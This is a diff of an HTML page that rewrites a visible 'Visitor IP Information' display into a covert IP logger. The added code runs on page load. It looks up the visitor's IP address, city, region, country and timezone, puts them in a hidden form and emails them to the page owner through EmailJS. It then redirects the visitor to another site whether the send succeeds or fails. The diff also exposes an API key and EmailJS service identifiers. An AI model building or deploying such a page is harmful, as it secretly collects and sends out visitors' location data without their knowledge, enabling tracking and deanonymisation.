@@ -1,71 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Full IP Info</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-      background: #f7f7f7;
-    }
-    h1 {
-      color: #333;
-    }
-    .info-container {
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-    .info-item {
-      margin-bottom: 10px;
-    }
-    .label {
-      font-weight: bold;
-      color: #555;
-    }
-  </style>
+  <title>Email IP Info</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
 <body>
+  <p>Sending IP info...</p>
 
-  <h1>Visitor IP Information</h1>
-  <div class="info-container" id="info">Loading...</div>
+  <!-- Hidden form to pass data to EmailJS -->
+  <form id="ipForm" style="display:none;">
+    <input type="text" name="ip" id="ip">
+    <input type="text" name="location" id="location">
+    <input type="text" name="timezone" id="timezone">
+  </form>
 
   <script>
-    const apiKey = 'a99c3907565a6ea32f77a0cbf7e000ef1542132a84d723250a2d7b08'; // Replace with your ipdata API key
+    // Init with your EmailJS User ID
+    emailjs.init('V7LWqw_T398fBIchE'); // replace with your EmailJS user ID
 
-    fetch(`https://api.ipdata.co?api-key=${apiKey}`)
-      .then(response => response.json())
+    fetch('https://api.ipdata.co?api-key=a99c3907565a6ea32f77a0cbf7e000ef1542132a84d723250a2d7b08')
+      .then(res => res.json())
       .then(data => {
-        const infoHTML = `
-          <div class="info-item"><span class="label">IP:</span> ${data.ip}</div>
-          <div class="info-item"><span class="label">City:</span> ${data.city}</div>
-          <div class="info-item"><span class="label">Region:</span> ${data.region}</div>
-          <div class="info-item"><span class="label">Postal Code:</span> ${data.postal}</div>
-          <div class="info-item"><span class="label">Country:</span> ${data.country_name} (${data.country_code})</div>
-          <div class="info-item"><span class="label">Continent:</span> ${data.continent_name} (${data.continent_code})</div>
-          <div class="info-item"><span class="label">Latitude:</span> ${data.latitude}</div>
-          <div class="info-item"><span class="label">Longitude:</span> ${data.longitude}</div>
-          <div class="info-item"><span class="label">Calling Code:</span> +${data.calling_code}</div>
-          <div class="info-item"><span class="label">Languages:</span> ${data.languages.map(lang => lang.name).join(', ')}</div>
-          <div class="info-item"><span class="label">Currency:</span> ${data.currency.name} (${data.currency.code})</div>
-          <div class="info-item"><span class="label">Time Zone:</span> ${data.time_zone.name} (UTC${data.time_zone.offset})</div>
-          <div class="info-item"><span class="label">Current Time:</span> ${data.time_zone.current_time}</div>
-          <div class="info-item"><span class="label">ASN:</span> ${data.asn.asn} - ${data.asn.name}</div>
-          <div class="info-item"><span class="label">ASN Domain:</span> ${data.asn.domain}</div>
-          <div class="info-item"><span class="label">ASN Route:</span> ${data.asn.route}</div>
-          <div class="info-item"><span class="label">ASN Type:</span> ${data.asn.type}</div>
-          <div class="info-item"><span class="label">Threat - Proxy:</span> ${data.threat.is_proxy}</div>
-          <div class="info-item"><span class="label">Threat - Tor:</span> ${data.threat.is_tor}</div>
-          <div class="info-item"><span class="label">Threat - VPN:</span> ${data.threat.is_vpn}</div>
-          <div class="info-item"><span class="label">Threat - Hosting Provider:</span> ${data.threat.is_datacenter}</div>
-        `;
-        document.getElementById('info').innerHTML = infoHTML;
+        document.getElementById('ip').value = data.ip;
+        document.getElementById('location').value = `${data.city}, ${data.region}, ${data.country_name}`;
+        document.getElementById('timezone').value = data.time_zone.name;
+
+        emailjs.sendForm('service_6k65f5v', 'template_tv0xrg9', '#ipForm')
+          .then(() => {
+            window.location.href = 'https://example.com'; // Redirect after email is sent
+          }, (error) => {
+            console.error('Email send failed:', error);
+            window.location.href = 'https://example.com'; // Redirect anyway
+          });
       })
-      .catch(error => {
-        document.getElementById('info').innerHTML = 'Error fetching data: ' + error;
+      .catch(err => {
+        console.error('IP fetch error:', err);
+        window.location.href = 'https://example.com'; // Fallback redirect
       });
   </script>
-
 </body>
 </html>
